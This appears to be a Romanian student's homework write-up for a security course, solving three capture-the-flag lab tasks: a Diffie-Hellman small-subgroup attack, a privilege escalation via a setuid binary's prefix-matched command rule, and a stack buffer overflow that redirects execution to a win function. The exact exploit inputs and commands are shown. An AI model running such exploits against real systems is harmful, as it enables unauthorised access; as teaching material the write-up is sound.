## Digori Parascovia - Tema 1 - TSSC

# Task 1 - Crypto Attack

### FLAG: SpeishFlag{wFVeSgN56EvRpCHCb6K7dyMTTE8KhIgw}

Pentru a rezolva acest task am folosit labul 02 si am creat un script de decodificare decrypt_crypto_attack.py.
Scriptul de decodificare are 2 parti (partea a 2-a este comentata initial).

-> *Partea 1 a scriptului - determina cheia mea "yours"*
```
python3 decrypt_crypto_attack.py
```
Am setat parametrii furnizați de server pentru schimbul de chei Diffie-Hellman: numărul prim p, generatorul g 
și cheia publică a serverului my_pub. De asemenea, am setat aceeasi dimensiunea a blocului și padding-ul pentru 
criptarea AES ca si in scriptul original flagz0rx.py. Am setat cheia mea publică la p - 1. Aceasta cheie se va
trimite serverului în timpul schimbului de chei Diffie-Hellman. 

Resultat script -> My key (variabila "yours")
Actiuni: Introduc in server cheia mea obtinuta din script si obtin flagul criptat. 


-> *Partea 2 a scriptului - decodfica flagul criptat*
```
python3 decrypt_crypto_attack.py
```
Decomentez partea a doua a scriptului si introduc la linia 26 flagul criptat -> rulez scriptul din nou.
Serverul calculează secretul comun ca pow(yours, my_priv, p). Conform Teoremei Lui Fermat, când cheia mea publică
este p - 1, secretul comun devine p - 1.

Decriptez flag-ul folosind cifrul AES în modul ECB și cheia derivată. 
Deoarece flag-ul a fost umplut cu octeți nuli (b'\x00'), elimin padding-ul apelând rstrip(PADDING).
Se decodifica octeții flag-ului decriptat ca un șir ASCII și afisez flag-ul.


# Task 2 - Linux ACL

### FLAG: SpeishFlag{dBY9TJZ0zHc1bDMuXSCTjGfCkHzEVUsO}

*1. Initial am incercat sa gasesc tot ce pot legat de flag si hinturi in sistemul de fisiere.*

```
janitor@fhunt:/usr/local/bin$ find /var -type f -exec grep -l 'hints' {} +
```
Am gasit fisierul /var/.hints.txt din care am aflat:
  - No ideas? Try to ltrace the setuid binaries!
  - Try to find the hidden config directory ;) 
(Found /usr/games/hunt/manele/robosudo.conf)
  - How does that custom sudo binary match the allowed command? How about its
    arguments?
  - You can add scripts to the same dir as sudo-permitted ones, but you cannot
    delete/modify them due to sticky bit :P

*2. Ispectez fisierele date*
```
janitor@fhunt:/usr/local/bin$ ls -la
total 52
drwxrwxr-t+ 1 root    root     4096 Apr 20 18:14 .
drwxr-xr-x  1 root    root     4096 Apr  5  2022 ..
-rwxr-xr-x  1 janitor janitor    74 Apr 10  2022 janitor-coffee.sh
-rwxr-xr-x  1 janitor janitor   228 Apr 10  2022 janitor-vacuum.sh
-rwsr-xr-x  1 roombax boss    17408 Apr 20 18:12 robot-sudo
-rwxr-xr-x  1 root    root      163 Apr 10  2022 vacuum-control
-rwxr-xr-x  1 janitor janitor   237 Apr 20 18:14 vacuum-control-v1
```
Din acest output inteleg ca trebuie sa cercetez atent fisierul robo-sudo fiind unicul 
fisierul cu userul roombax, la care nu aveam acces. 

*3. Am facut strings peste robot-sudo*
```
janitor@fhunt:/usr/local/bin$ strings robot-sudo 
```
Si am aflat informatia:
Please supply a command as argument!
Unable to determine current user! Exiting...
Hey, no shell injection please!
Invalid command given!
/usr/games/hunt/manele/robosudo.conf
Missing configuration file!

-> Deci am gasit fisierul de configurare a permisiunilor /usr/games/hunt/manele/robosudo.conf
Nu pot modifica acest fisierul dar observ regulile:
```
allow roombax /.you.are.never/.gonnafindthis/0b3y.b0ss
allow janitor /usr/local/bin/vacuum-control
```
-> Deci concluzionez ca am un fisier /.you.are.never/.gonnafindthis/0b3y.b0ss care cel mai probabil 
imi apeleaza flagul dar la care nu am acces pentru ca doar roombax are permisiuni. 
In schimb ca janitor pot rula orice script cu prefixul /usr/local/bin/vacuum-control 

Deci pentru a gasi flagul trebuie sa imi asum rolul de roombax prin robot-sudo, apeland un script custom
prefixat cu /usr/local/bin/vacuum-control

Am incercat mai multe variante de script si de input pentru acesta. 

*4. Am cercetat fisierul /.you.are.never/.gonnafindthis/0b3y.b0ss*
```
janitor@fhunt:/usr/local/bin$ strings /.you.are.never/.gonnafindthis/0b3y.b0ss
```
Unde am gasit outputul interesant:
4c0e1c8764ff9adc821a1edd7fef6c22
Access denied!
I will contact you when I require your cleaning services, janitor!
Congratulations, here's your flag:
cat /usr/lib/ziggy/damn/ouflagfrumos

Am mai incercat sa accesez acest fisier secret dar totul in zadar, dar in combinatie cu aceasta cheie 
s-a deschis un output similar cu cel dat de strings, deci acest string is o cheie de acees pentru fisierul secret.

```
janitor@fhunt:/usr/local/bin$ /.you.are.never/.gonnafindthis/0b3y.b0ss 4c0e1c8764ff9adc821a1edd7fef6c22
I will contact you when I require your cleaning services, janitor!
```

*5. Am copiat /usr/local/bin/vacuum-control in /usr/local/bin/vacuum-control-v1*
Pe care l-am adaptat cu urmatorul cod:
```
janitor@fhunt:/usr/local/bin$ cat /usr/local/bin/vacuum-control-v1
#!/bin/bash

if [[ $EUID -lt 7000 ]]; then
    echo "ERROR: Access denied!"
    exit 1
fi

/.you.are.never/.gonnafindthis/0b3y.b0ss 4c0e1c8764ff9adc821a1edd7fef6c22
cat /usr/lib/ziggy/damn/ouflagfrumos

janitor@fhunt:/usr/local/bin$ robot-sudo /usr/local/bin/vacuum-control-v1  /.you.are.never/.gonnafindthis/0b3y.b0ss 4c0e1c8764ff9adc821a1edd7fef6c22
Congratulations, here's your flag:
SpeishFlag{dBY9TJZ0zHc1bDMuXSCTjGfCkHzEVUsO}
```
*Tadam! a aparut flagul!*

# Task 3 - Binary-exploit
### FLAG: SpeishFlag{aNsujkz3YgeWpwuGyOgoQLy6LHz50GyH}

Pentru acest task am deschis binarul casino in ghidra, unde am inceput sa analizez functiile date, 
unde am observat ca din functia principala main se intra in loop, dar din cel din urma nu exista nicio referinta
de a intra in win. In timp ce functia win deschidea un fisier "flag" in care cel mai probabil trebuia sa gasesc
flagul ca raspuns. Pentru a ajung in functia win din loop m-am gandit ca ar trebui sa fac un buffer overflow, 
astfel am observat vectorul uint local_fc [59] folosit pentru a citi caractere de la ecran.

*Astfel am incercat cateva metode, de unde solutia finala e descrisa mai jos.*
1. M-am conectat la server
2. Mi-am introdus numele
3. Am introdus 59 de caractere de '0' si un padding the alte 4 caractere -> total 64 de '0'
4. Am adaugat adresa functiei win in decimal (luata din ghidra)
5. Am adaugat caracterul x

➜  telnet isc2023.1337.cx 10076
Trying 141.85.228.32...
Connected to isc2023.1337.cx.
Escape character is '^]'.
Welcome to the Saint Tropez Virtual Casino!
Please enter your name:
Pasha
Welcome, Pasha
Starting money: $4200

Please enter the list of numbers you want to roll (write 'x' to stop): 
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 134514406 x
Your lucky number was: 3503
You got: 0 out of 64
Account balance: $8490
Continue? [Y/n]y
You shall not pass!

Program exited with 2

### Resultat: 
-> Aici am observat ca am intrat cu succes in functia win dar aceasta necesita inca un parametru, 
dat de functia loop ca fiind lucky_number. 

*Urmatoarea incercare*
1. M-am conectat la server
2. Mi-am introdus numele
3. Am introdus 59 de caractere de '0' si un padding the alte 4 caractere -> total 64 de '0'
4. Am incercat sa intru in functia loop asa ca am adaugat adresa functiei loop in decimal (luata din ghidra)
5. Am adaugat caracterul x
6. Folosesc optiunea de 'no' pentru ca sa sa evit regenerarea lui lucky_number in functia loop

Please enter the list of numbers you want to roll (write 'x' to stop): 
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 134514611 x
Your lucky number was: 4483
You got: 0 out of 64
Account balance: $3190
Continue? [Y/n]n
Okay, farewell!

7. In loop mai incerc odata sa introduc cele 63 de '0' si acum sa fac buffer overflow functiei win prin lucky_numberul din loop
8. Scriu adresa in decimal al lui win
9. Un caracter random pentru adresa de retur a functiei win
10. Adaug lucky number pastrat de mai inainte si x


Please enter the list of numbers you want to roll (write 'x' to stop): 
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 134514406 0 4483 x
Your lucky number was: 4483
You got: 257 out of 66
Sorry, you lost all your money :( 
https://www.youtube.com/watch?v=SIqkZIwa9cw
SpeishFlag{aNsujkz3YgeWpwuGyOgoQLy6LHz50GyH}
### Resultat: 
Obtinem Flagul: SpeishFlag{aNsujkz3YgeWpwuGyOgoQLy6LHz50GyH}
